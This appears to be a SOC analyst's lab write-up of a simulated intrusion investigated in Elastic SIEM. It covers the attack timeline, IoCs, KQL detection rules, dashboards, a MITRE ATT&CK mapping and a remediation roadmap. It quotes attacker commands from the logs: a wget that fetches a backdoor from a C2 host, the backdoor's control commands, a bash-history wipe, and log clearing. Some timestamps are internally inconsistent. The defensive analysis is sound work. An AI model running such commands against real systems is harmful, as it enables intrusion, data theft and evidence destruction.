# 🛡️ Advanced Adversary Lifecycle Analysis: Hybrid Infrastructure Compromise & Data Exfiltration in Elastic SIEM
## 1. 📋 Project Objective
The primary goal of this project is to architect and validate a **unified Security Operations Center (SOC) ecosystem** capable of detecting and reconstructing complex, multi-stage cyber attacks. By leveraging **Elastic Stack (SIEM)** for cross-platform telemetry correlation, this simulation demonstrates:

* **Advanced Forensic Reconstruction:** Utilizing centralized logs (`linuxauth`, `windows_log`, `network_log`) to deconstruct an adversary's movement from initial access to anti-forensic operations.
* **Detection Engineering:** Implementing high-fidelity **KQL (Kibana Query Language)** alerting logic to identify unauthorized access to sensitive directories and anomalous administrative behavior.
* **Framework Alignment:** Mapping observed adversary TTPs to the **MITRE ATT&CK** and **Cyber Kill Chain** frameworks to identify defensive gaps in a hybrid infrastructure.
* **Infrastructure Hardening:** Bridging the gap between reactive analysis and proactive defense by formulating a **Zero Trust** remediation roadmap and EDR deployment strategy.

## 2. 🏗️ Lab Setup & Architecture
The investigation was conducted in a controlled environment designed to simulate a corporate infrastructure with hybrid workloads.

| Component | Asset / Tool | Description & Role |
| :--- | :--- | :--- |
| **SIEM Platform** | **Elastic Stack (Kibana)** | Centralized ingestion, normalization, and visualization of security telemetry. |
| **Entry Vector** | **Ubuntu Server (10.0.1.254)** | Linux-based management tier; initial point of compromise via `service_account`. |
| **Target Asset** | **Windows Fileserver (10.0.0.15)** | Core repository for intellectual property (Financial/Project data). |
| **Adversary C2** | **External IP (45.227.255.186)** | Attacker-controlled infrastructure used for malware delivery and exfiltration. |
| **Logging Agents** | **Auditbeat / Winlogbeat** | Real-time shipment of authentication, process execution, and file integrity logs. |
| **Network Monitor**| **Packetbeat / Suricata** | Capturing SMB handshake metadata and outbound exfiltration spikes on port 1337. |

## 3. 🛡️ Incident Case Study: "Operation Shadow Share"
### 📝 Executive Summary
Demo Lab encountered suspicious activity in its corporate network. This caused serious concern for the information security department. On March 8, 2025, SOC specialists recorded several anomalous events that may indicate an attempted targeted attack on the company's infrastructure. For a detailed investigation of the incident and to develop a defense strategy, Demo Lab turned to me for help.

The investigation confirmed that despite the attacker’s use of **Anti-Forensic techniques**—specifically clearing the Windows Event Logs via `wevtutil` and purging Bash history—centralized SIEM telemetry provided an immutable record of the attack. The breach culminated in the exfiltration of **2.5 MB** of sensitive corporate data (`data_export.zip`) to a remote C2 server over a non-standard TCP port.

## ⛓️ Attack Timeline & Chain (TL;DR)
| Time (UTC) | Event | Index |
| :--- | :--- | :--- |
| 01:19:15 | Successful login to the system by user "service_account" | linuxauth |
| 01:24:45 | Downloading a backdoor from 45.227.255.186 on ubuntu-server| linuxauth |
| 01:36:18 | First SMB connection with Windows Server. Port 445 | network_log |
| 01:45:28 | Backdoor installation, authentication, SMB check | linuxauth, network_log |
| 01:47:21 | Enumeration of SMB resources on Windows Server | linuxauth |
| 01:49:37 | Access to the network folder Finance1 | windows_log |
| 01:52:28 | Creating the data_export.zip archive on a Windows server | windows_log |
| 01:55:56 | Exfiltration of the archive (2.5 MB) to the C2 server | network_log |
| 02:04:57 | Clearing logs via backdoor on Linux | linuxauth |
| 02:05:24 | Removing backdoor files from a Linux server | linuxauth |
| 02:06:27 | Clearing the bash command history | linuxauth |
| 02:10:45 | Running wevtutil to clear Windows logs | windows_log |
| 02:15:42 | Clearing the Windows audit log | windows_log |

## 🔍 Intelligence & Indicators of Compromise (IoCs)

### IP-addresses and Hosts
| IP-address | Role | Related activity |
|---------------|------|-------------|
| 45.227.255.186| C2 server | Backdoor source, receiving stolen data |
| 10.0.1.254 | Compromised Ubuntu server | A springboard for attack, a source of exfiltration |
| 10.0.0.15 | Compromised Windows server | Source of stolen data |
---

### Accounts
| Account | System | Activities |
|---------------|------|-------------|
| service_account | Ubuntu server | Downloading a backdoor and executing attack commands |
| service_account | Windows fileserver | Access to files, create an archive, clear logs |
| 10.0.0.15 | Compromised Windows server | Source of stolen data |
---

### Files
| File | Location | Purpose |
|---------------|------|-------------|
| /tmp/update| Ubuntu server | Description of the backdoor file's purpose |
| C:\Temp\data_export.zip | Windows Fileserver | Archive with stolen data |
---

### URL's and domains

| URL/domain | Descrition | 
|---------------|------|
| http//45.227.255.186/backdoor | Backdoor download source | 
---

### Network Indicators

|Protocol | Port | Description|
|---------------|------|------|
| TCP | 1337 | C2 channel for backdoor control and exfiltration |
| TCP | 445 | SMB access to Windows resources |

---

# 🕵️ Main Investigation

## Point 1. Analysis of network logs, Linux logs, Windows logs and building an attack timeline.

First, I will import each log file into Kibana and look at it in Discover.

![](https://github.com/cbrkrtek/SOC-analyst-hands-on-labs/blob/main/Advanced%20Adversary%20Lifecycle%20Analysis%3A%20Hybrid%20Infrastructure%20Compromise%20%26%20Data%20Exfiltration%20in%20Elastic%20SIEM/Screenshots/screen1.PNG)

We see that at 03:02:20, the user "sysadmin" connected via SSH from the private IP address 203.0.113.10. This host's data was likely compromised, as no network connections are present in the network logs at 03:02:20 (we'll see this later).
Then, at 03:05:28, the so-called "sysadmin" executes the command "top -bn1." This command outputs a one-time snapshot of the current system state to the console: a list of processes sorted by CPU consumption (by default), as well as information about CPU load, memory (RAM, swap), the number of tasks, etc.
The screenshot shows that at 03:46:22, a password was approved for the user "devops" from the same host, but from a different port (which could also confirm a data compromise on this host). We notice something amiss, especially that the sysadmin logged into their account at 3 AM, long after the workday had ended. It's also odd that the "devops" user needed the nginx server status at 3:48:22 AM, plus viewing the syslog file from "sysadmin" during non-working hours.

Since we know that multiple SSH login attempts to server 10.0.1.254 (ubuntu server) have been recorded, let's look at the network logs:

![](https://github.com/cbrkrtek/SOC-analyst-hands-on-labs/blob/main/Advanced%20Adversary%20Lifecycle%20Analysis%3A%20Hybrid%20Infrastructure%20Compromise%20%26%20Data%20Exfiltration%20in%20Elastic%20SIEM/Screenshots/screen2.PNG)

We see that at 03:52:34, an SSH connection was established (as indicated by destination port 22). Then, a connection was established to the Ubuntu server from IP: 10.0.0.14.

Let's look at the traffic diagram (look at the network logs):

![](https://github.com/cbrkrtek/SOC-analyst-hands-on-labs/blob/main/Advanced%20Adversary%20Lifecycle%20Analysis%3A%20Hybrid%20Infrastructure%20Compromise%20%26%20Data%20Exfiltration%20in%20Elastic%20SIEM/Screenshots/screen3.PNG)

We see that a large number of events occurred between 4 and 5 a.m.

Returning to the network log analysis, we see that an unsecured connection was established over the HTTP protocol, with the source being a file server (Windows server).

![](https://github.com/cbrkrtek/SOC-analyst-hands-on-labs/blob/main/Advanced%20Adversary%20Lifecycle%20Analysis%3A%20Hybrid%20Infrastructure%20Compromise%20%26%20Data%20Exfiltration%20in%20Elastic%20SIEM/Screenshots/screen4.PNG)

Next we see that the IP address: 45.227.255.186 connected to the Ubuntu server 5 times:

![](https://github.com/cbrkrtek/SOC-analyst-hands-on-labs/blob/main/Advanced%20Adversary%20Lifecycle%20Analysis%3A%20Hybrid%20Infrastructure%20Compromise%20%26%20Data%20Exfiltration%20in%20Elastic%20SIEM/Screenshots/screen5.PNG)

Let's look at the Ubuntu server logs, aka Linux logs:

![](https://github.com/cbrkrtek/SOC-analyst-hands-on-labs/blob/main/Advanced%20Adversary%20Lifecycle%20Analysis%3A%20Hybrid%20Infrastructure%20Compromise%20%26%20Data%20Exfiltration%20in%20Elastic%20SIEM/Screenshots/screen6.PNG)

We see that a user with IP:45.227.255.186 attempted to connect via SSH. It's easy to guess that this was a brute force attack: the attacker attempted to connect to the same host from different ports in a relatively short period of time, with each login attempt being unsuccessful. However, at 04:17:23, we see "Accepted password for admin from 10.0.0.22." Most likely, host 10.0.0.22 is also infected, since it was also used to log in using the admin account. This would correspond to the following technique in Mittre Att&ck:

![](https://github.com/cbrkrtek/SOC-analyst-hands-on-labs/blob/main/Advanced%20Adversary%20Lifecycle%20Analysis%3A%20Hybrid%20Infrastructure%20Compromise%20%26%20Data%20Exfiltration%20in%20Elastic%20SIEM/Screenshots/screen7.PNG)

Let's look at the connections established with the windows server.

![](https://github.com/cbrkrtek/SOC-analyst-hands-on-labs/blob/main/Advanced%20Adversary%20Lifecycle%20Analysis%3A%20Hybrid%20Infrastructure%20Compromise%20%26%20Data%20Exfiltration%20in%20Elastic%20SIEM/Screenshots/screen8.PNG)

We see that IP:203.0.113.11 established a connection to the Windows server via port 80 (an unsecured HTTP connection). The screenshot also shows that after 20 minutes, IP:10.0.1.254 (the Ubuntu server) established a connection to the Windows server (IP:10.0.0.15), with the destination port being 445 (port 445 is used for file transfers—the SMB protocol, over TCP/IP).

Next we notice in Linux logs:

![](https://github.com/cbrkrtek/SOC-analyst-hands-on-labs/blob/main/Advanced%20Adversary%20Lifecycle%20Analysis%3A%20Hybrid%20Infrastructure%20Compromise%20%26%20Data%20Exfiltration%20in%20Elastic%20SIEM/Screenshots/screen9.PNG)

The administrator ran the command: "netstat -tulpn." This command is used in Linux to display information about network connections, ports, and processes. Let's break it down by flags:
-t (TCP) — show TCP ports (connected and listening).
-u (UDP) — show UDP ports.
-l (listening) — show only listening sockets (waiting for incoming connections).
-p (program) — show the PID and name of the process using the port.
-n (numeric) — do not convert IP addresses and port numbers to names (i.e., shows 0.0.0.0:22, not *:ssh).

And the most interesting thing is that the IP address 45.227.255.186 can successfully connect via SSH to the service_account account.

![](https://github.com/cbrkrtek/SOC-analyst-hands-on-labs/blob/main/Advanced%20Adversary%20Lifecycle%20Analysis%3A%20Hybrid%20Infrastructure%20Compromise%20%26%20Data%20Exfiltration%20in%20Elastic%20SIEM/Screenshots/screen10.PNG)

![](https://github.com/cbrkrtek/SOC-analyst-hands-on-labs/blob/main/Advanced%20Adversary%20Lifecycle%20Analysis%3A%20Hybrid%20Infrastructure%20Compromise%20%26%20Data%20Exfiltration%20in%20Elastic%20SIEM/Screenshots/screen11.PNG)

Next, you can confirm that the "service_account" account is compromised. This is because commands are then executed to gather information about the host. For example, reading the /etc/passwd file indicates the acquisition of important user information, such as the username, home directory, and so on. This corresponds to the following tactic in Mittre Att&ck:

![](https://github.com/cbrkrtek/SOC-analyst-hands-on-labs/blob/main/Advanced%20Adversary%20Lifecycle%20Analysis%3A%20Hybrid%20Infrastructure%20Compromise%20%26%20Data%20Exfiltration%20in%20Elastic%20SIEM/Screenshots/screen12.PNG)

![](https://github.com/cbrkrtek/SOC-analyst-hands-on-labs/blob/main/Advanced%20Adversary%20Lifecycle%20Analysis%3A%20Hybrid%20Infrastructure%20Compromise%20%26%20Data%20Exfiltration%20in%20Elastic%20SIEM/Screenshots/screen13.PNG)

Next, we see that service_account executed the command:
```
find / -name *config* -type f 2>/dev/null
```
This means the attacker searched for all files in the file system that contained the substring "config" and concealed all access errors (this is what 2>/dev/null is responsible for, meaning it redirects the error stream, such as a "Permission denied" error, to the special file /dev/null, which deletes everything written to it, thereby "covering its tracks in the system." The following tactic in Mittre Att&ck is responsible for this:

![](https://github.com/cbrkrtek/SOC-analyst-hands-on-labs/blob/main/Advanced%20Adversary%20Lifecycle%20Analysis%3A%20Hybrid%20Infrastructure%20Compromise%20%26%20Data%20Exfiltration%20in%20Elastic%20SIEM/Screenshots/screen14.PNG)

I decided to choose this technique because the attacker modifies the behavior of tools (find).
- Output suppression = changing default behavior
- Error hiding (removing them) = making detection more difficult
- Part of the "live off the land" strategy, because the /dev/null folder is already in the system. This confirms this strategy.

And then comes a very important point in the log. We see that at 04:24:45, service_account executed:

```
wget “http://45.227.255.186/backdoor” -O /tmp/update
```

This means that the user used wget to install a backdoor, which then became entrenched in /tmp/update. This corresponds to the following tactic in Mittre Att&ck:

![](https://github.com/cbrkrtek/SOC-analyst-hands-on-labs/blob/main/Advanced%20Adversary%20Lifecycle%20Analysis%3A%20Hybrid%20Infrastructure%20Compromise%20%26%20Data%20Exfiltration%20in%20Elastic%20SIEM/Screenshots/screen15.PNG)

Let's check the reputation of the IP address: 45.227.255.186.

![](https://github.com/cbrkrtek/SOC-analyst-hands-on-labs/blob/main/Advanced%20Adversary%20Lifecycle%20Analysis%3A%20Hybrid%20Infrastructure%20Compromise%20%26%20Data%20Exfiltration%20in%20Elastic%20SIEM/Screenshots/screen16.PNG)

We see that the reputation is zero. This suggests that this is a custom-written backdoor that hasn't previously surfaced in our analysis.

Next, we see that the user grants execute privileges to this file using the command: chmod +x /tmp/update . This file is then executed, i.e., the backdoor is launched.

![](https://github.com/cbrkrtek/SOC-analyst-hands-on-labs/blob/main/Advanced%20Adversary%20Lifecycle%20Analysis%3A%20Hybrid%20Infrastructure%20Compromise%20%26%20Data%20Exfiltration%20in%20Elastic%20SIEM/Screenshots/screen17.PNG)


Next, the attacker searches the .log files in the admin user's home directory. They also search the list for all user processes, formatting the output based on user data such as CPU and memory usage, and including processes without a terminal connection, such as daemons and background services, that contain the substring "apache" (using the command ps aux | grep "apache").

Then, the external IP address 103.45.76.34 attempts to connect via SSH to the Ubuntu server, but is unable to do so.

We then see that a user account named "alex" has logged in via SSH from a host on our local network, IP: 10.0.0.12.

Then, the user alex runs the command `du -sh /var ` , which
calculates and displays the total disk space occupied by the entire /var directory and all its contents (including all subfolders and files).

![](https://github.com/cbrkrtek/SOC-analyst-hands-on-labs/blob/main/Advanced%20Adversary%20Lifecycle%20Analysis%3A%20Hybrid%20Infrastructure%20Compromise%20%26%20Data%20Exfiltration%20in%20Elastic%20SIEM/Screenshots/screen18.PNG)

The logs then show an important event: service_account executed a command to connect to SMB resources to view available shares on the remote host. Then, logically, the command establishes an interactive SMB session with the remote server 10.0.0.15 and connects to the Shares shared folder as the service_account user, allowing file operations (viewing, downloading, uploading, and deleting).
Next, we see a command the attacker uses to attempt a netcat connection to IP: 10.0.0.15, port 445. Then, from the "service_account" account, the attacker runs the executable file /tmp/update and commands it to connect to server 10.0.0.15 on port 445. This infected not only the Ubuntu server but also the Windows server.

![](https://github.com/cbrkrtek/SOC-analyst-hands-on-labs/blob/main/Advanced%20Adversary%20Lifecycle%20Analysis%3A%20Hybrid%20Infrastructure%20Compromise%20%26%20Data%20Exfiltration%20in%20Elastic%20SIEM/Screenshots/screen19.PNG)

And then the command is executed:
```
/tmp/update -c ‘auth service_account’
```
This means the backdoor authenticates to the attacker's C2 server. This is a critical step in establishing control over the infected system.

After this, the attacker had previously compromised the /etc/shadow file, which contained user data and passwords.

![](https://github.com/cbrkrtek/SOC-analyst-hands-on-labs/blob/main/Advanced%20Adversary%20Lifecycle%20Analysis%3A%20Hybrid%20Infrastructure%20Compromise%20%26%20Data%20Exfiltration%20in%20Elastic%20SIEM/Screenshots/screen20.PNG)

Since user "maria" executed the command

```
grep ERROR /var/log/apache2/error.log
```
This means the user searched for all Apache2 errors in the error.log file. Also note the command
```
/tmp/update -c 'access share Financial'
```
It means that the compromised host connects to the Financial share, mounts or grants access, and views the share's contents.

![](https://github.com/cbrkrtek/SOC-analyst-hands-on-labs/blob/main/Advanced%20Adversary%20Lifecycle%20Analysis%3A%20Hybrid%20Infrastructure%20Compromise%20%26%20Data%20Exfiltration%20in%20Elastic%20SIEM/Screenshots/screen21.PNG)

Next, the compromised account downloaded the data_export.zip zip archive to IP:45.227.255.186, port 1337. This means that IP:45.227.255.186 is the attacker's C2 server. In other words, it was an exfiltration of a sensitive archive.

![](https://github.com/cbrkrtek/SOC-analyst-hands-on-labs/blob/main/Advanced%20Adversary%20Lifecycle%20Analysis%3A%20Hybrid%20Infrastructure%20Compromise%20%26%20Data%20Exfiltration%20in%20Elastic%20SIEM/Screenshots/screen22.PNG)

Next, service_account executed a command to clear the logs. It then executed a command to delete the file /tmp/update. It then entered a command that clears the command history for the current user session, removing all traces of previously entered commands ( echo '' >~/bash_history). Finally, it closed the session for the compromised user.

Now let's analyze the Windows server logs, also known as the file server.

![](https://github.com/cbrkrtek/SOC-analyst-hands-on-labs/blob/main/Advanced%20Adversary%20Lifecycle%20Analysis%3A%20Hybrid%20Infrastructure%20Compromise%20%26%20Data%20Exfiltration%20in%20Elastic%20SIEM/Screenshots/screen23.PNG)

We see that confidential data was accessed in addition to the `data_export.zip` archive.

Then the attacker then logged out of the service_account account.

## Point 2. Setting up correlation rules.

### 1-st rule: Detecting brute-force password attacks via the SSH protocol 

Move to Security -> Rules -> Import rule
But before importing the correlation rule, you need to write it. The correlation rule can be found in the same directory as README.md.


![](https://github.com/cbrkrtek/SOC-analyst-hands-on-labs/blob/main/Advanced%20Adversary%20Lifecycle%20Analysis%3A%20Hybrid%20Infrastructure%20Compromise%20%26%20Data%20Exfiltration%20in%20Elastic%20SIEM/Screenshots/screen24.PNG)

We get the following correlation rule, which is triggered when there are more than five unsuccessful SSH login attempts within 10 minutes from a single IP address. It's important to understand that this rule will only work for host 10.0.1.254; if other servers are being brute-forced, the rule won't detect it. This doesn't mean the rule is bad; it's just that if we had several servers, the correlation rule would look completely different.

### 2-nd rule: Detection of successful host compromise after brute force

![](https://github.com/cbrkrtek/SOC-analyst-hands-on-labs/blob/main/Advanced%20Adversary%20Lifecycle%20Analysis%3A%20Hybrid%20Infrastructure%20Compromise%20%26%20Data%20Exfiltration%20in%20Elastic%20SIEM/Screenshots/screen25.PNG)


![](https://github.com/cbrkrtek/SOC-analyst-hands-on-labs/blob/main/Advanced%20Adversary%20Lifecycle%20Analysis%3A%20Hybrid%20Infrastructure%20Compromise%20%26%20Data%20Exfiltration%20in%20Elastic%20SIEM/Screenshots/screen26.PNG)

![](https://github.com/cbrkrtek/SOC-analyst-hands-on-labs/blob/main/Advanced%20Adversary%20Lifecycle%20Analysis%3A%20Hybrid%20Infrastructure%20Compromise%20%26%20Data%20Exfiltration%20in%20Elastic%20SIEM/Screenshots/screen27.PNG)

In the schedule rule, we set the launch every 5 minutes (the same as in the 1st rule), but we understand that in a real SOC it is better to set 10 minutes to reduce the load on the system.

### 3-rd rule: Detecting mass access to sensitive files

![](https://github.com/cbrkrtek/SOC-analyst-hands-on-labs/blob/main/Advanced%20Adversary%20Lifecycle%20Analysis%3A%20Hybrid%20Infrastructure%20Compromise%20%26%20Data%20Exfiltration%20in%20Elastic%20SIEM/Screenshots/screen28.PNG)

![](https://github.com/cbrkrtek/SOC-analyst-hands-on-labs/blob/main/Advanced%20Adversary%20Lifecycle%20Analysis%3A%20Hybrid%20Infrastructure%20Compromise%20%26%20Data%20Exfiltration%20in%20Elastic%20SIEM/Screenshots/screen29.PNG)

Don't forget to add the "windows_logs" index pattern, which stores our Windows server logs, and don't forget the correlation rule startup time. I specified 5 minutes to test the rule, but we understand that in a real SOC, you'll need to set the autostart every 10 minutes.

### 4-th rule: Detecting abnormal outgoing traffic

![](https://github.com/cbrkrtek/SOC-analyst-hands-on-labs/blob/main/Advanced%20Adversary%20Lifecycle%20Analysis%3A%20Hybrid%20Infrastructure%20Compromise%20%26%20Data%20Exfiltration%20in%20Elastic%20SIEM/Screenshots/screen30.PNG)

![](https://github.com/cbrkrtek/SOC-analyst-hands-on-labs/blob/main/Advanced%20Adversary%20Lifecycle%20Analysis%3A%20Hybrid%20Infrastructure%20Compromise%20%26%20Data%20Exfiltration%20in%20Elastic%20SIEM/Screenshots/screen31.PNG)

### 5-th rule: Detecting the full incident chain: from brute force to exfiltration

![](https://github.com/cbrkrtek/SOC-analyst-hands-on-labs/blob/main/Advanced%20Adversary%20Lifecycle%20Analysis%3A%20Hybrid%20Infrastructure%20Compromise%20%26%20Data%20Exfiltration%20in%20Elastic%20SIEM/Screenshots/screen32.PNG)

![](https://github.com/cbrkrtek/SOC-analyst-hands-on-labs/blob/main/Advanced%20Adversary%20Lifecycle%20Analysis%3A%20Hybrid%20Infrastructure%20Compromise%20%26%20Data%20Exfiltration%20in%20Elastic%20SIEM/Screenshots/screen33.PNG)


## Point 3. Creating dashboards

### Visualizing Failed Login Attempts

In the left menu, select the Visualize library. Next, create a visualization (click the "Create visualization" button in the upper right corner). Select Lens from the Recommended section.

In the window that appears, select our authentication log index (in my case, linuxauth).

Now that we've reached the visualization itself, in the right panel, select the Bar chart type. In the left panel, select the @timestamp field and drag it to the right panel in the Horizontal Axis section. Also, select the source.ip.keyword field and drag it to the Breakdown area (in the Breakdown, we'll select displaying the top 10 IP address values). In the Vertical Axis field, select "count" to see how many times an IP address was visible at a certain time.
And at the top of the screen, enter the query:
```
event.category: "authentication" and authentication.success: false
```

So, we're looking for "authentication" events, and their result should be false.
We get a diagram like this:

![](https://github.com/cbrkrtek/SOC-analyst-hands-on-labs/blob/main/Advanced%20Adversary%20Lifecycle%20Analysis%3A%20Hybrid%20Infrastructure%20Compromise%20%26%20Data%20Exfiltration%20in%20Elastic%20SIEM/Screenshots/screen34.PNG)

### Create a line graph of network traffic



I follow the same steps as for visualizing failed login attempts, but select network traffic logs (in my case, network_logs ). Select the Line chart type. In the left panel, select the @timestamp field and drag it to the right panel in the Horizontal Axis section. Select the network.bytes field and drag it to the Vertical Axis field. Also, select the destination.ip.keyword field and drag it to the Breakdown field. For the network.bytes field, select Sum as the aggregation instead of Count. Also, don't forget to enter the query:
```
source.ip: "10.0.1.254" and network.bytes > 10000
```
In this query, we're looking specifically at traffic originating from the Ubuntu server (ip: 10.0.1.254), and the number of bytes in this traffic must exceed 10000 to detect abnormal network activity.

![](https://github.com/cbrkrtek/SOC-analyst-hands-on-labs/blob/main/Advanced%20Adversary%20Lifecycle%20Analysis%3A%20Hybrid%20Infrastructure%20Compromise%20%26%20Data%20Exfiltration%20in%20Elastic%20SIEM/Screenshots/screen35.PNG)


### Creating a file system event table

I perform the same actions as in dashboards 1 and 2. I select the windows_logs index because the file server is a windows server, as I mentioned earlier. Select the Table chart type. In the rows field, drag the @timestamp field and select the Date Histogram function. I also drag the file.path.keyword and user.name.keyword fields. In the Metrics field, select Count of records. And be sure to specify the query:
```
file.path: *Shares* and file.path: (*Financial* or *HR* or *Project* or *Research*)
```
This query searches for a path in the file path that contains the substring "Shares" (required!) and also the substring "Financial," "HR," "Project," or "Research."
So, we get a table like this:

![](https://github.com/cbrkrtek/SOC-analyst-hands-on-labs/blob/main/Advanced%20Adversary%20Lifecycle%20Analysis%3A%20Hybrid%20Infrastructure%20Compromise%20%26%20Data%20Exfiltration%20in%20Elastic%20SIEM/Screenshots/screen36.PNG)


### Creating security metrics

Again, the first steps are similar. In the Visualization section, select Metric. Also, select the Ubuntu server logs (linuxauth). In the Horizontal Axis, select @timestamp. In the Vertical Axis, select the count function (this will be responsible for the number of failed authentication attempts). Don't forget to write the query:
```
event.category: "authentication" and authentication.success: false
```
As in the first dashboard, select the event category "authentication" and the authentication result "false." According to the event logic, if these two events return True, then we add 1 to the Failed attempts counter. As a result, we see the following metric:

![](https://github.com/cbrkrtek/SOC-analyst-hands-on-labs/blob/main/Advanced%20Adversary%20Lifecycle%20Analysis%3A%20Hybrid%20Infrastructure%20Compromise%20%26%20Data%20Exfiltration%20in%20Elastic%20SIEM/Screenshots/screen37.PNG)

### Creating IP address distribution diagram

We'll repeat the first steps from the previous points. On the right, select the Pie visualization type. In Slice by, specify the source.ip.keyword field for the chart segments. Also, in the right panel, select Metric and then Count to count the number of unsuccessful events a specific IP address has encountered. Finally, enter the following query:
```
authentication.success : false
```
In other words, we're looking for unsuccessful authentication attempts.

![](https://github.com/cbrkrtek/SOC-analyst-hands-on-labs/blob/main/Advanced%20Adversary%20Lifecycle%20Analysis%3A%20Hybrid%20Infrastructure%20Compromise%20%26%20Data%20Exfiltration%20in%20Elastic%20SIEM/Screenshots/screen38.PNG)


### MITRE ATT&CK Framework Attack Analysis

| Tactic | Technique | Action Description |
| :--- | :--- | :--- |
| **Initial Access** | T1078.003: Valid Accounts - Local Accounts | Compromised the `service_account` credentials to gain entry. |
| **Execution** | T1059.004: Command and Scripting Interpreter - Unix Shell | Executed malicious commands via the bash shell. |
| **Execution** | T1204.002: User Execution - Malicious File | Executed the backdoor binary located at `/tmp/update`. |
| **Privilege Escalation** | — | All activities were performed using the pre-existing privileges of the `service_account`. |
| **Defense Evasion** | T1070.004: Indicator Removal on Host - File Deletion | Deleted backdoor files and artifacts from the Linux server. |
| **Defense Evasion** | T1070.001: Indicator Removal on Host - Clear Windows Event Logs | Used `wevtutil` to clear Windows event logs and obfuscate activity. |
| **Defense Evasion** | T1562.001: Impair Defenses - Disable or Modify Tools | Cleared bash command history to prevent command-line auditing. |
| **Credential Access** | T1555: Credentials from Password Stores | Potential extraction of stored credentials via the deployed backdoor. |
| **Lateral Movement** | T1021.002: Remote Services - SMB/Windows Admin Shares | Accessed the Windows server and network shares via the SMB protocol. |
| **Collection** | T1560.001: Archive Collected Data - Archive via Utility | Compressed sensitive data into a ZIP archive (`data_export.zip`). |
| **Collection** | T1005: Data from Local System | Gathered sensitive information and files from the local file system. |
| **Exfiltration** | T1048.003: Exfiltration Over Alternative Protocol | Exfiltrated the archive to a C2 server using a raw TCP connection. |

## Conclusions and Recommendations

### Executive Summary
The success of the attack was primarily due to the following systemic vulnerabilities and contributing factors:

* **Shared Credentials:** The use of identical credentials across both Linux and Windows environments facilitated seamless lateral movement for the attacker.
* **Lack of Network Segmentation:** The absence of internal firewalls allowed unrestricted communication between servers in different zones.
* **Insufficient Monitoring:** Inadequate auditing of privileged account activity allowed the adversary to operate undetected for an extended period.
* **Insecure Host Configurations:** The lack of execution controls (noexec) on the `/tmp/` directory permitted the execution of the malicious backdoor.

---

### Security Improvement Roadmap

#### Short-Term Measures (Immediate Remediation)
> **Objective:** Contain the current threat and prevent immediate re-entry.

1.  **System Isolation:** Immediately isolate compromised hosts: `ubuntu-server (10.0.1.254)` and `Windows Fileserver (10.0.0.15)` from the production network.
2.  **Network Indicators Blocking:** Blacklist the malicious external IP address `45.227.255.186` at the perimeter firewall.
3.  **Credential Rotation:** Perform a mandatory password reset for the `service_account` and all associated administrative or service accounts.
4.  **Forensic Investigation:** Conduct a detailed forensic analysis to identify any persistent backdoors or additional artifacts of compromise.

####  Medium-Term Measures (Next 30–90 Days)
> **Objective:** Address technical gaps and improve detection capabilities.

* **Authentication Strengthening:**
    * Implement Multi-Factor Authentication (**MFA**) for all privileged and service accounts.
    * Enforce the Principle of Least Privilege (**PoLP**) to restrict account access to necessary resources only.
* **Network Segmentation:**
    * Restrict access to SMB ports (445) to authorized management workstations only via internal access control lists (ACLs).
* **Monitoring Enhancement:**
    * Deploy detection rules for binary execution within world-writable directories (e.g., `/tmp/`, `/var/tmp/`).
    * Configure real-time alerts for event log clearing (e.g., `wevtutil`) and command history deletion.

#### Long-Term Measures (Strategic Strategy)
> **Objective:** Build a resilient security posture and "Defense in Depth."

1.  **Endpoint Security:** Deploy an **EDR (Endpoint Detection and Response)** solution across all infrastructure to enable deep forensic visibility and automated threat blocking.
2.  **Advanced Perimeter Defense:** Implement a **Next-Generation Firewall (NGFW)** to perform deep packet inspection and identify encrypted C2 (Command & Control) traffic.
3.  **Identity & Access Management (IAM):**
    * Transition to certificate-based authentication for server-to-server communication.
    * Establish a regular audit cycle for credentials and implement secure, off-site (cloud) backups for identity configurations.

# Conclusion

As a result of a targeted cyberattack, criminals succeeded in stealing intellectual property. The attack was complex and multi-stage, and involved the extensive use of trace concealment techniques. The key factors contributing to the compromise were weaknesses in the existing information security system: the use of shared passwords and the lack of proper segregation of network segments. Implementing the proposed set of measures will not only mitigate the consequences of the incident but also significantly strengthen the organization's security. Priority should be given to implementing a least-privilege model (preferably Zero Trust) and strengthening controls over the activity of accounts with elevated privileges.
